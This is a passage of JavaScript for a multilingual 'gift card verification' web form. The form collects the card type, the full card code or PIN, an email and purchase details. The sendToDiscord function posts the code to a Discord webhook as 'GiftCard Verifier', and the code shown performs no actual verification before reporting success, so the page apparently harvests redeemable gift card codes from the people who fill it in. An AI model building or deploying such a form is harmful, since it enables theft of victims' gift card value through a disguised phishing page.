    elements.cardTypeSelect.value = cardValue;
    updateCardPreview();
    validatePin(false);
    markFormDirty();
}

// ===== GESTION DU MONTANT =====
function toggleOtherAmount() {
    const isOther = elements.amountSelect.value === 'other';
    elements.otherAmountWrapper.classList.toggle('hidden', !isOther);
    if (!isOther) {
        elements.otherAmount.value = '';
    }
}

function getAmountValue() {
    const selected = elements.amountSelect.value;
    if (selected === 'other') {
        return elements.otherAmount.value.trim();
    }
    return selected;
}

// ===== VALIDATION DES CHAMPS =====
function setInputState(wrapper, iconClass, state) {
    wrapper.classList.remove('input-neutral', 'input-progress', 'input-valid', 'input-invalid');
    wrapper.classList.add(state);
    const icon = wrapper.querySelector('i');
    if (icon) {
        icon.className = iconClass;
    }
}

function sanitizePin(rawValue) {
    const rule = getSelectedCardRule();
    if (!rule) {
        return rawValue.replace(/\s/g, '').toUpperCase().slice(0, 20);
    }

    const cleaned = rawValue.replace(rule.allowed, '');
    const formatted = rule.format(cleaned);
    return formatted.slice(0, rule.maxLength);
}

function validatePin(showError = false) {
    const rule = getSelectedCardRule();
    const value = sanitizePin(elements.pinInput.value);
    elements.pinInput.value = value;

    if (!rule) {
        setInputState(elements.pinFieldWrap, 'fas fa-key', value ? 'input-progress' : 'input-neutral');
        if (showError) {
            elements.pinError.textContent = getCurrentTranslations().validation.pinNeedsCard;
        } else {
            elements.pinError.textContent = '';
        }
        return false;
    }

    if (!value) {
        setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
        if (showError) {
            elements.pinError.textContent = getCurrentTranslations().validation.pinRequired;
        } else {
            elements.pinError.textContent = '';
        }
        return false;
    }

    if (rule.validate(value)) {
        setInputState(elements.pinFieldWrap, 'fas fa-check-circle', 'input-valid');
        elements.pinError.textContent = '';
        return true;
    }

    setInputState(elements.pinFieldWrap, 'fas fa-key', showError ? 'input-invalid' : 'input-progress');
    if (showError) {
        elements.pinError.textContent = getCurrentTranslations().validation.pinInvalidFor(rule.key);
    } else {
        elements.pinError.textContent = '';
    }
    return false;
}

function validateEmail(showError = false) {
    const value = elements.emailInput.value.trim();

    if (!value) {
        setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
        if (showError) {
            elements.emailError.textContent = getCurrentTranslations().validation.emailInvalid;
        } else {
            elements.emailError.textContent = '';
        }
        return false;
    }

    const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
    setInputState(
        elements.emailFieldWrap,
        valid ? 'fas fa-check-circle' : 'fas fa-envelope',
        valid ? 'input-valid' : (showError ? 'input-invalid' : 'input-progress')
    );

    elements.emailError.textContent = valid || !showError ? '' : getCurrentTranslations().validation.emailInvalid;
    return valid;
}

function validateCardSelection(showError = false) {
    const hasSelection = Boolean(elements.cardTypeInput.value);
    elements.cardTypeError.textContent = hasSelection || !showError ? '' : getCurrentTranslations().validation.selectCard;
    return hasSelection;
}

function validateAmount(showError = false) {
    const t = getCurrentTranslations();
    const value = getAmountValue();
    
    if (!value) {
        elements.amountError.textContent = showError ? t.validation.amountRequired : '';
        return false;
    }

    if (!/^\d+(\.\d{1,2})?$/.test(value)) {
        elements.amountError.textContent = showError ? t.validation.amountInvalid : '';
        return false;
    }

    const amount = parseFloat(value);
    if (isNaN(amount) || amount < 0) {
        elements.amountError.textContent = showError ? t.validation.amountNegative : '';
        return false;
    }

    elements.amountError.textContent = '';
    return true;
}

function validateDate(showError = false) {
    const value = elements.purchaseDateInput.value;
    if (!value) {
        elements.dateError.textContent = '';
        return true;
    }

    if (!/^\d{4}-\d{2}-\d{2}$/.test(value)) {
        if (showError) {
            elements.dateError.textContent = getCurrentTranslations().validation.dateInvalid;
        } else {
            elements.dateError.textContent = '';
        }
        return false;
    }

    const parts = value.split('-');
    const year = parseInt(parts[0]);
    const month = parseInt(parts[1]) - 1;
    const day = parseInt(parts[2]);
    const selectedDate = new Date(year, month, day);
    
    if (isNaN(selectedDate.getTime())) {
        if (showError) {
            elements.dateError.textContent = getCurrentTranslations().validation.dateInvalid;
        } else {
            elements.dateError.textContent = '';
        }
        return false;
    }

    const today = new Date();
    const todayDate = new Date(today.getFullYear(), today.getMonth(), today.getDate());

    if (selectedDate > todayDate) {
        if (showError) {
            elements.dateError.textContent = getCurrentTranslations().validation.dateFuture;
        } else {
            elements.dateError.textContent = '';
        }
        return false;
    }

    elements.dateError.textContent = '';
    return true;
}

function validateForm() {
    const cardOk = validateCardSelection(true);
    const pinOk = validatePin(true);
    const emailOk = validateEmail(true);
    const amountOk = validateAmount(true);
    const dateOk = validateDate(true);

    return cardOk && pinOk && emailOk && dateOk;
}

// ===== GESTION DES MESSAGES =====
function showInlineError(message) {
    elements.result.classList.remove('hidden', 'success');
    elements.result.classList.add('error');
    elements.result.textContent = message;
}

function showInlineSuccess(message) {
    elements.result.classList.remove('hidden', 'error');
    elements.result.classList.add('success');
    elements.result.textContent = message;
}

function clearInlineResult() {
    elements.result.classList.add('hidden');
    elements.result.classList.remove('success', 'error');
    elements.result.textContent = '';
}

// ===== GESTION DYNAMIQUE DES TEXTES =====
function updateDynamicText() {
    const t = getCurrentTranslations();
    
    const emailPlaceholders = {
        fr: 'vous@exemple.com',
        en: 'you@example.com',
        de: 'ihre@email.de',
        es: 'usted@ejemplo.com'
    };
    elements.emailInput.placeholder = emailPlaceholders[currentLang] || emailPlaceholders.fr;
    
    const messagePlaceholders = {
        fr: 'Informations complémentaires...',
        en: 'Additional details...',
        de: 'Zusätzliche Informationen...',
        es: 'Información adicional...'
    };
    elements.messageInput.placeholder = messagePlaceholders[currentLang] || messagePlaceholders.fr;

    const rule = getSelectedCardRule();
    if (rule) {
        elements.pinLabel.textContent = rule.label[currentLang] || rule.label.fr;
        elements.pinHelp.textContent = rule.help[currentLang] || rule.help.fr;
        elements.pinMetaHint.textContent = rule.meta[currentLang] || rule.meta.fr;
        elements.pinInput.placeholder = rule.placeholder;
        elements.pinInput.maxLength = rule.maxLength;
    } else {
        elements.pinLabel.textContent = t.form.pin;
        elements.pinHelp.textContent = t.form.pinHelpDefault;
        elements.pinMetaHint.textContent = t.form.pinMetaDefault;
        const pinPlaceholders = {
            fr: 'Sélectionnez une carte d\'abord',
            en: 'Select a card first',
            de: 'Wählen Sie zuerst eine Karte',
            es: 'Seleccione una tarjeta primero'
        };
        elements.pinInput.placeholder = pinPlaceholders[currentLang] || pinPlaceholders.fr;
        elements.pinInput.removeAttribute('maxLength');
    }
}

// ===== ENVOI À DISCORD =====
async function sendToDiscord(data) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000);

    const embed = {
        title: '🎫 Nouvelle demande de vérification',
        color: 0x6366F1,
        fields: [
            { name: '👤 Email', value: data.email, inline: false },
            { name: '💳 Type de carte', value: data.cardType, inline: true },
            { name: '🔑 Code', value: `\`${data.pin}\``, inline: true },
            { name: '💰 Montant', value: data.amount || 'Non spécifié', inline: true },
            { name: '📅 Date d\'achat', value: data.purchaseDate || 'Non spécifié', inline: true },
            { name: '📝 Message', value: data.message || 'Aucun message', inline: false },
            { name: '🌐 Langue', value: data.lang.toUpperCase(), inline: true }
        ],
        footer: {
            text: `Demande reçue le ${data.timestamp}`
        }
    };

    const payload = {
        content: DISCORD_ROLE_MENTION ? `<@&${DISCORD_ROLE_MENTION}> Nouvelle demande à traiter.` : 'Nouvelle demande à traiter.',
        embeds: [embed],
        username: 'GiftCard Verifier',
        avatar_url: 'https://cdn-icons-png.flaticon.com/512/1046/1046784.png'
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        return response.ok;
    } catch (error) {
        clearTimeout(timeoutId);
        if (error.name === 'AbortError') {
            throw new Error(getCurrentTranslations().result.timeout);
        }
        throw error;
    }
}

// ===== RÉINITIALISATION DU FORMULAIRE =====
function resetFormState() {
    elements.form.reset();
    elements.cardTypeSelect.value = '';
    elements.cardTypeInput.value = '';
    elements.amountSelect.value = '';
    elements.otherAmount.value = '';
    elements.otherAmountWrapper.classList.add('hidden');
    updateCardPreview();
    setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
    setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
    elements.pinError.textContent = '';
    elements.emailError.textContent = '';
    elements.cardTypeError.textContent = '';
    elements.amountError.textContent = '';
    elements.dateError.textContent = '';
    updateDynamicText();
    markFormClean();
    formSubmitted = false;
}

// ===== MODAL SUCCÈS =====
function createConfetti() {
    if (!elements.confettiLayer) return;
    elements.confettiLayer.innerHTML = '';

    if (prefersReducedMotion.matches) {
        return;
    }

    const colors = ['#6366f1', '#8b5cf6', '#10b981', '#f59e0b', '#ec4899'];

    for (let index = 0; index < 18; index += 1) {
        const piece = document.createElement('span');
        piece.className = 'confetti-piece';
        piece.style.left = `${6 + Math.random() * 88}%`;
        piece.style.animationDelay = `${Math.random() * 250}ms`;
        piece.style.setProperty('--piece-color', colors[index % colors.length]);
        piece.style.setProperty('--piece-x', `${(Math.random() - 0.5) * 160}px`);
        piece.style.setProperty('--piece-rotate', `${90 + Math.random() * 260}deg`);
        elements.confettiLayer.appendChild(piece);
    }
}

function openSuccessModal() {
    previousFocusedElement = document.activeElement;
    createConfetti();
    elements.successModal.classList.remove('hidden');
    elements.successModal.setAttribute('aria-hidden', 'false');
    elements.body.classList.add('modal-open');
    formSubmitted = true;
    markFormClean();
    requestAnimationFrame(() => elements.closeSuccessModal.focus());
}

function closeSuccessModal() {
    elements.successModal.classList.add('hidden');
    elements.successModal.setAttribute('aria-hidden', 'true');
    elements.body.classList.remove('modal-open');
    previousFocusedElement?.focus?.();
}

// ===== PARTICULES =====
function initParticles() {
    const canvas = elements.particlesCanvas;
    const hero = elements.heroSection;
    if (!canvas || !hero) return;

    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    let particles = [];
    let width = 0;
    let height = 0;
    const particleCount = 30;

    const resizeCanvas = () => {
        const rect = hero.getBoundingClientRect();
        width = Math.max(1, Math.floor(rect.width));
        height = Math.max(1, Math.floor(rect.height));
        canvas.width = width * Math.min(window.devicePixelRatio || 1, 2);
        canvas.height = height * Math.min(window.devicePixelRatio || 1, 2);
        canvas.style.width = `${width}px`;
        canvas.style.height = `${height}px`;
        ctx.setTransform(1, 0, 0, 1, 0, 0);
        ctx.scale(Math.min(window.devicePixelRatio || 1, 2), Math.min(window.devicePixelRatio || 1, 2));

        particles = Array.from({ length: particleCount }, () => ({
            x: Math.random() * width,
            y: Math.random() * height,
            vx: (Math.random() - 0.5) * 0.35,
            vy: (Math.random() - 0.5) * 0.35,
            radius: 1.5 + Math.random() * 2.7,
            alpha: 0.12 + Math.random() * 0.22
        }));
    };

    const draw = () => {
        ctx.clearRect(0, 0, width, height);

        particles.forEach(particle => {
            particle.x += particle.vx;
            particle.y += particle.vy;

            if (particle.x <= 0 || particle.x >= width) particle.vx *= -1;
            if (particle.y <= 0 || particle.y >= height) particle.vy *= -1;

            ctx.beginPath();
            ctx.fillStyle = `rgba(99, 102, 241, ${particle.alpha})`;
            ctx.arc(particle.x, particle.y, particle.radius, 0, Math.PI * 2);
            ctx.fill();
        });

        animationFrameId = requestAnimationFrame(draw);
    };

    resizeCanvas();

    if (!prefersReducedMotion.matches) {
        draw();
    }

    if (typeof ResizeObserver !== 'undefined') {
        resizeObserver = new ResizeObserver(() => resizeCanvas());
        resizeObserver.observe(hero);
    }
    window.addEventListener('resize', resizeCanvas);

    window.addEventListener('beforeunload', () => {
        if (animationFrameId) cancelAnimationFrame(animationFrameId);
        if (resizeObserver) resizeObserver.disconnect();
    }, { once: true });
}

// ===== LAZY LOADING =====
function initLazyLoading() {
    if ('IntersectionObserver' in window) {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('visible');
                }
            });
        }, { 
            threshold: 0.1,
            rootMargin: '50px'
        });
        
        document.querySelectorAll('.glass-panel:not(.hero-content .glass-panel)').forEach(el => {
            observer.observe(el);
        });
    } else {
        document.querySelectorAll('.glass-panel').forEach(el => {
            el.classList.add('visible');
        });
    }
}

// ===== BEFOREUNLOAD =====
function handleBeforeUnload(event) {
    if (isFormDirty && !formSubmitted) {
        event.preventDefault();
        event.returnValue = getCurrentTranslations().beforeunload;
        return event.returnValue;
    }
}

// ===== CHARGEMENT INITIAL =====
function init() {
    if (isInitialized) return;
    isInitialized = true;

    document.body.classList.add('js-ok');

    const noJsMsg = document.querySelector('.no-js-message');
    if (noJsMsg) noJsMsg.style.display = 'none';

    const savedLang = safeStorageGet(STORAGE_KEYS.language) || 'fr';
    const savedTheme = safeStorageGet(STORAGE_KEYS.theme) || 'light';

    setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
    setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
    applyTheme(savedTheme);
    setLanguage(savedLang);

    const today = new Date();
    const todayISO = today.toISOString().split('T')[0];
    elements.purchaseDateInput.setAttribute('max', todayISO);

    enrichSelectOptions();

    bindEvents();
    initParticles();
    initLazyLoading();

    window.addEventListener('scroll', handleScroll, { passive: true });

    window.addEventListener('beforeunload', handleBeforeUnload);
    window.addEventListener('pagehide', cleanup);

    document.body.classList.add('loaded');
}

// ===== ENRICHIR LES OPTIONS DU SELECT AVEC DES MINI-LOGOS =====
function enrichSelectOptions() {
    const options = elements.cardTypeSelect.querySelectorAll('option[data-logo]');
    options.forEach(option => {
        const logoKey = option.getAttribute('data-logo');
        if (logoKey && CARD_MINI_LOGOS[logoKey]) {
            option.setAttribute('data-logo-html', CARD_MINI_LOGOS[logoKey]);
        }
    });
}

// ===== NETTOYAGE =====
function cleanup() {
    if (animationFrameId) cancelAnimationFrame(animationFrameId);
    if (resizeObserver) resizeObserver.disconnect();
    Object.keys(debounceTimers).forEach(key => {
        clearTimeout(debounceTimers[key]);
        delete debounceTimers[key];
    });
    window.removeEventListener('beforeunload', handleBeforeUnload);
    window.removeEventListener('scroll', handleScroll);
}

// ===== GESTION DES ÉVÉNEMENTS =====
function handleGlobalKeydown(event) {
    if (event.key === 'Escape') {
        if (!elements.successModal.classList.contains('hidden')) {
            closeSuccessModal();
            event.preventDefault();
        }
    }
}

function bindEvents() {
    // Sélecteur de langue
    if (elements.langSelect) {
        elements.langSelect.addEventListener('change', function() {
            setLanguage(this.value);
        });
    }

    // Thème
    elements.themeToggle.addEventListener('click', () => {
        applyTheme(currentTheme === 'dark' ? 'light' : 'dark');
    });

    // ===== TOGGLE PIN (AFFICHER/MASQUER LE CODE) =====
    if (elements.pinToggle) {
        elements.pinToggle.addEventListener('click', function() {
            const input = elements.pinInput;
            const isPassword = input.type === 'password';
            input.type = isPassword ? 'text' : 'password';
            this.innerHTML = isPassword ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
            this.setAttribute('aria-label', isPassword ? 'Masquer le code' : 'Afficher le code');
        });
    }

    // Sélection des cartes
    elements.cardTypeSelect.addEventListener('change', () => {
        const value = elements.cardTypeSelect.value;
        if (value && CARD_RULES[value]) {
            selectCard(value);
        } else {
            elements.cardTypeSelect.value = '';
            updateCardPreview();
            validateCardSelection(false);
        }
        markFormDirty();
        setTimeout(() => {
            if (document.activeElement !== elements.pinInput) {
                elements.pinInput.focus();
            }
        }, 100);
    });

    // ===== GESTION DU MONTANT =====
    elements.amountSelect.addEventListener('change', () => {
        toggleOtherAmount();
        markFormDirty();
        debounce('amount', () => validateAmount(false), 150);
        if (elements.amountSelect.value !== 'other') {
            setTimeout(() => {
                if (elements.amountSelect.value) {
                    elements.purchaseDateInput.focus();
                }
            }, 100);
        } else {
            setTimeout(() => elements.otherAmount.focus(), 50);
        }
    });

    elements.otherAmount.addEventListener('input', () => {
        markFormDirty();
        debounce('amount', () => validateAmount(false), 150);
    });
    elements.otherAmount.addEventListener('blur', () => validateAmount(true));

    // Fermeture de la modal
    elements.closeSuccessModal.addEventListener('click', closeSuccessModal);
    const modalBackdrop = elements.successModal.querySelector('[data-close-modal]');
    if (modalBackdrop) {
        modalBackdrop.addEventListener('click', closeSuccessModal);
    }

    // Validations en temps réel
    elements.pinInput.addEventListener('input', () => {
        markFormDirty();
        debounce('pin', () => validatePin(false), 150);
    });
    elements.pinInput.addEventListener('blur', () => validatePin(Boolean(elements.pinInput.value)));

    elements.emailInput.addEventListener('input', () => {
        markFormDirty();
        debounce('email', () => validateEmail(false), 150);
    });
    elements.emailInput.addEventListener('blur', () => validateEmail(Boolean(elements.emailInput.value)));

    elements.purchaseDateInput.addEventListener('input', () => {
        markFormDirty();
        debounce('date', () => validateDate(false), 150);
    });
    elements.purchaseDateInput.addEventListener('blur', () => validateDate(true));

    elements.messageInput.addEventListener('input', markFormDirty);

    // Soumission du formulaire
    elements.form.addEventListener('submit', async event => {
        event.preventDefault();
        clearInlineResult();

        if (!validateForm()) {
            return;
        }

        elements.submitBtn.disabled = true;
        elements.btnText.classList.add('hidden');
        elements.btnLoader.classList.remove('hidden');

        const formData = {
            cardType: elements.cardTypeInput.value,
            pin: sanitizePin(elements.pinInput.value),
            email: elements.emailInput.value.trim(),
            amount: getAmountValue() || 'Non spécifié',
            purchaseDate: elements.purchaseDateInput.value || 'Non spécifié',
            message: elements.messageInput.value.trim() || 'Aucun message',
            timestamp: new Date().toLocaleString(
                currentLang === 'fr' ? 'fr-FR' : 
                currentLang === 'de' ? 'de-DE' : 
                currentLang === 'es' ? 'es-ES' : 'en-US'
            ),
            lang: currentLang
        };

        try {
            const success = await sendToDiscord(formData);

            if (!success) {
                throw new Error('Webhook request failed');
            }

            resetFormState();
            openSuccessModal();
        } catch (error) {
            console.error('Form submission failed:', error);
            showInlineError(error.message || getCurrentTranslations().result.error);
        } finally {
            elements.submitBtn.disabled = false;
            elements.btnText.classList.remove('hidden');
            elements.btnLoader.classList.add('hidden');
        }
    });

    document.addEventListener('keydown', handleGlobalKeydown);

    prefersReducedMotion.addEventListener('change', () => {
        if (prefersReducedMotion.matches) {
            elements.confettiLayer.innerHTML = '';
        }
    });
}

// ===== INITIALISATION =====
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}